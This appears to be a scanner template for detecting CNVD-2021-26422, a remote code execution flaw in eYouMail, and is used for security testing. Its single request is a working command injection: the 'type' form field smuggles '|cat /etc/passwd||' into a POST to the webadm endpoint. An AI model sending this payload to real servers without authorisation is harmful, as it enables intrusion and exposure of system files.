id: CNVD-2021-26422
brief:
    title: eYouMail - Remote Code Execution
    by: daffainfo
    level: critical
    about: eYouMail is susceptible to a remote code execution vulnerability.
    label:
        - cnvd2021
        - cnvd
        - eyoumail
        - rce
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/webadm/?q=moni_detail.do&action=gragh'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: type='|cat /etc/passwd||'
      signs:
        - "on": status
          status:
            - 200
